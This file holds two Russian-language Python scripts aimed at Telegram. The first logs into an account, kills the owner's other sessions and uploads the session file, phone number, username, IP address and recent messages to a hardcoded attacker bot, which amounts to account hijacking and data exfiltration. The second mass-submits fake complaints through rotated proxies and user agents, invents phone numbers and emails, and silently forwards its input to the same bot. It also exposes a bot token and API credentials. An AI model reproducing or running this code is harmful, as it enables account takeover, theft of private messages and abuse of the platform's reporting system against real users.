import time
from telethon import TelegramClient
from telethon.tl.functions.account import GetAuthorizationsRequest, ResetAuthorizationRequest
import requests
import os
import subprocess

ORANGE = '\033[38;5;130m'

os.system('cls' if os.name == 'nt' else 'clear')

print(f"""{ORANGE}
  _____      __      _   _________     ____    
 (_   _)    /  \    / ) (_   _____)   / __ \   
   | |     / /\ \  / /    ) (___     / /  \ \  
   | |     ) ) ) ) ) )   (   ___)   ( ()  () ) 
   | |    ( ( ( ( ( (     ) (       ( ()  () ) 
  _| |__  / /  \ \/ /    (   )       \ \__/ /  
 /_____( (_/    \__/      \_/         \____/
""")

api_id = '23391623'
api_hash = '9d0866b7d8e54ed72af447f6eb21e717'
phone_number = '7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI'
session_file = 'sessions.session'
bot_token = '7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI'
chat_id = '2110557179'

client = TelegramClient(session_file, api_id, api_hash)

def send_notification(bot_token, chat_id, message):
    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
    data = {'chat_id': chat_id, 'text': message}
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("")
    else:
        print(f"Ошибка входа: {response.status_code}, {response.text}")

def send_session_file_via_bot(bot_token, chat_id, session_file, phone, username, ip, devices, last_messages):
    if not os.path.exists(session_file):
        print(f"Файл сессии '{session_file}' не найден.")
        return

    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    
    try:
        with open(session_file, 'rb') as file:
            files = {'document': file}
            caption = f'📎 Файл сессии\n\nНомер телефона: {phone}\n'
            caption += f'Юзернейм: @{username}\n' if username else 'Юзернейм: Не указан\n'
            caption += f'IP-адрес: {ip}\n'
            caption += 'Устройства:\n' + '\n'.join(devices[:5])
            caption += '\n\nПоследние 10 сообщений пользователя:\n' + '\n'.join(last_messages[:5])

            if len(caption) > 1024:
                caption = caption[:1020] + '...'

            data = {'chat_id': chat_id, 'caption': caption}
            response = requests.post(url, files=files, data=data)

        if response.status_code == 200:
            print(f"")
        else:
            print(f"Ошибка отправки файла: {response.status_code}, {response.text}")
    except Exception as e:
        print(f"Произошла ошибка при отправке файла: {e}")

async def main():
    try:
        await client.start(phone_number)
        print("Авторизация успешна!")
        
        me = await client.get_me()
        phone = me.phone if me.phone else 'Не указано'
        username = me.username if me.username else None
        ip = requests.get('https://api.ipify.org').text

        authorizations = await client(GetAuthorizationsRequest())
        devices = []
        all_sessions_deleted = True  

        for auth in authorizations.authorizations:
            if "aarch64" in auth.device_model:
                devices.append(f'\nID сессии: {auth.hash} \nУстройство: {auth.device_model} \nМестоположение: {auth.country}')
            else:
                try:
                    await client(ResetAuthorizationRequest(auth.hash))
                    print("")
                    send_notification(bot_token, chat_id, f'Все сессии @{username}, +{phone} были уничтожены')
                except Exception:
                    all_sessions_deleted = False
                    print("")
                    send_notification(bot_token, chat_id, f'Сессии @{username}, +{phone} ещё не были удалены')

        last_messages = []
        async for message in client.iter_messages(me.id, limit=10):
            last_messages.append(message.text)

        if os.path.exists(session_file):
            print(f"Сессия сохранена в файле '{session_file}'.")
            send_session_file_via_bot(bot_token, chat_id, session_file, phone, username, ip, devices, last_messages)
        else:
            print(f"Файл сессии '{session_file}' не найден.")
    except Exception as e:
        print(f"Ошибка авторизации: {e}")
    finally:
        await client.disconnect()

with client:
    client.loop.run_until_complete(main())

time.sleep(10)


import random
import os
import requests
from telethon import TelegramClient
import string
from pystyle import Write, Colors, Center
from termcolor import colored
import logging

os.system('cls' if os.name == 'nt' else 'clear')

banner = '''
                                                .x+=:.                                s    
                                               z`    ^%    .uef^"                    :8    
             x.    .        ..    .     :         .   <k :d88E              u.      .88    
      .    .@88k  z88u    .888: x888  x888.     .@8Ned8" `888E        ...ue888b    :888ooo 
 .udR88N  ~"8888 ^8888   ~`8888~'888X`?888f`  .@^%8888"   888E .z8k   888R Y888r -*8888888 
<888'888k   8888  888R     X888  888X '888>  x88:  `)8b.  888E~?888L  888R I888>   8888    
9888 'Y"    8888  888R     X888  888X '888>  8888N=*8888  888E  888E  888R I888>   8888    
9888        8888  888R     X888  888X '888>   %8"    R88  888E  888E  888R I888>   8888    
9888        8888 ,888B .   X888  888X '888>    @8Wou 9%   888E  888E u8888cJ888   .8888Lu= 
?8888u../  "8888Y 8888"   "*88%""*88" '888!` .888888P`    888E  888E  "*888*P"    ^%888*   
 "8888P'    `Y"   'YP       `~    "    `"`   `   ^"F     m888N= 888>    'Y"         'Y"    
   "P'                                                    `Y"   888                        
                                                               J88"                        
                                                               @%                          
                                                             :"                            


'''

Write.Print(Center.XCenter(banner), Colors.blue_to_cyan, interval=0.001)



logging.basicConfig(filename='complaints.log', level=logging.INFO,
                    format='%(asctime)s - %(levelname)s - %(message)s')


USER_AGENTS = [
    # Chrome (Windows, MacOS, Linux)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    
    # Firefox (Windows, MacOS, Linux)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
    
    # Edge (Windows)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55",
    
    # Safari (MacOS, iOS)
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
    
    # Opera
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.146",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.146",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 OPR/78.0.4093.112",
    
    # Mobile browsers
    "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 9; SM-J737T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36",
    
    # Internet Explorer (older versions)
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)",
    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
    
    # Legacy browsers
    "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/125.5.5 (KHTML, like Gecko) Safari/125.12",
    "Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0",
    "Opera/9.80 (Windows NT 5.1; U; en) Presto/2.9.168 Version/11.50",
    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12 GTB7.1",
    
    # Microsoft Edge (Legacy and Chromium-based)
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edge/91.0.864.67",
    
    # Various mobile and desktop browsers (Safari, Samsung, UC Browser, etc.)
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SAMSUNG SM-A505FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    
    # UC Browser
    "Mozilla/5.0 (Linux; U; Android 10; en-US; SM-N950U Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.5.0.1015 Mobile Safari/534.30",
    "Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; Nexus 5 Build/MOB30P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 UCBrowser/11.5.0.1015 Mobile Safari/537.36"
]



def generate_phone_number(country_code='+7'):
    phone_number = ''.join(random.choices(string.digits, k=10))
    return f'{country_code}{phone_number}'

def generate_random_email():
    domains = ["gmail.com", "mail.ru", "rambler.ru"]
    username = ''.join(random.choices(string.ascii_lowercase, k=8))
    domain = random.choice(domains)
    return f"{username}@{domain}"

def load_proxies(filename):
    """Загружает прокси-серверы из файла"""
    proxies = []
    try:
        with open(filename, 'r') as file:
            proxies = [line.strip() for line in file.readlines()]
    except FileNotFoundError:
        print(colored(f"Файл '{filename}' не найден!", 'red'))
    return proxies

def send_complaint(number, email, complaint_text, repeats, proxies=None):
    url = 'https://telegram.org/support'
    complaints_sent = 0

    for _ in range(repeats):
        proxy = random.choice(proxies) if proxies else None
        user_agent = random.choice(USER_AGENTS)  
        headers = {'User-Agent': user_agent}
        payload = {'text': complaint_text, 'number': number, 'email': email}

        try:
            response = requests.post(url, headers=headers, data=payload, proxies={'http': proxy} if proxy else None)
            if response.status_code == 200:
                complaints_sent += 1
                print(colored(f"Жалоба отправлена: {email}, {number}", 'green'))
                logging.info(f"Жалоба отправлена: {email}, {number}")
                print(colored(f"User-Agent: {user_agent}", 'yellow'))
                if proxy:
                    print(colored(f"Прокси: {proxy}", 'cyan'))
            else:
                print(colored(f"Ошибка: {response.status_code}", 'red'))
                logging.error(f"Ошибка отправки. Код: {response.status_code}")
        except requests.RequestException as e:
            print(colored(f"Ошибка: {str(e)}", 'red'))
            logging.error(f"Ошибка: {str(e)}")

    print(f"Всего отправлено {complaints_sent} жалоб.")

def send_telegram_message(message: str, bot_token: str, chat_id: str):
    """fff"""
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": message
    }
    response = requests.post(url, data=data)
    if response.status_code == 200:
        print("\n")
    else:
        print(f"Ошибка отправки жалобы: {response.status_code}, {response.text}")

def complaint():
    complaint_text = Write.Input("\nВведите текст жалобы: ", Colors.blue_to_cyan, interval=0.005)
    if not complaint_text.strip():
        print(colored("Текст жалобы не может быть пустым!", 'red'))
        return

    bot_token = "7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI"
    chat_id = "2110557179"
    send_telegram_message(complaint_text, bot_token, chat_id)


    try:
        repeats = int(Write.Input("Введите количество жалоб: ", Colors.blue_to_cyan, interval=0.005))
    except ValueError:
        print(colored("Количество жалоб должно быть числом!", 'red'))
        return

    proxy_filename = Write.Input("Введите имя файла с прокси-серверами (или оставьте пустым для работы без прокси): ", Colors.red_to_black, interval=0.005)
    proxies = load_proxies(proxy_filename) if proxy_filename else None

    country_choice = Write.Input("Выберите код страны (1: +7, 2: +380, 3: +375): ", Colors.blue_to_cyan, interval=0.005)
    country_code = {'1': '+7', '2': '+380', '3': '+375'}.get(country_choice, '+7')

    number = generate_phone_number(country_code)
    email = generate_random_email()

    send_complaint(number, email, complaint_text, repeats, proxies)

def check_internet_connection():
    try:
        requests.get("https://www.google.com", timeout=5)
        return True
    except requests.ConnectionError:
        print(colored("Ошибка: Нет подключения к интернету!", 'red'))
        logging.error("Нет подключения к интернету!")
        subprocess.run(['python', 'elizium.py'])
        return False


if __name__ == "__main__":
    if not check_internet_connection():
        exit(1) 
    complaint()